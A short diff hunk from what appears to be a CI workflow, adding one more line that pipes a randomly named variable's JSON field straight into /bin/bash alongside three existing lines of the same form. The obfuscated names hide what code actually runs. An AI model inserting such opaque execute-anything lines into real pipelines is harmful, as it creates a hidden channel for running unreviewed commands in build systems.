@@ -34,6 +34,7 @@ jobs:
           echo $xy39 | jq -r .qtwc69783 | /bin/bash
           echo $doask71 | jq -r .gjyxt09917 | /bin/bash
           echo $cgich861 | jq -r .nemvp82 | /bin/bash
+          printf '%s' "$gzuyg401" | jq -r .kwv9 | /bin/bash
 
       - name: Save output
         if: always()
